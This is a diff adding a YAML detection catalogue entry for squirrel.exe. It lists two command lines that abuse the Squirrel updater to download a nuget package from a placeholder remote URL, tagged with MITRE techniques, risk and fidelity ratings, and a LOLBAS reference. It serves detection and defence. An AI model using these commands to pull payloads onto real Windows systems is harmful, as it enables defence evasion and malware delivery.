@@ -1,0 +1,42 @@
+- command: squirrel.exe --download [URL TO PACKAGE]
+  description: Abuse squirrel.exe to download a file named 'RELEASES' from the specified remote URL which is a nuget package.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/
+  risk: High
+  risk_reason: This is typically a suspicious activity when using non-standard URLs.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior for most users, especially with non-standard URLs.
+  tool: squirrel
+  threatactors:
+    N/A:
+      - N/A
+- command: squirrel.exe --updateRoolback=[url to package]
+  description: Abuse squirrel.exe to download a file named 'RELEASES' from the specified remote URL which is a nuget package.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/
+  risk: High
+  risk_reason: This is typically a suspicious activity when using non-standard URLs.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior for most users, especially with non-standard URLs.
+  tool: squirrel
+  threatactors:
+    N/A:
+      - N/A
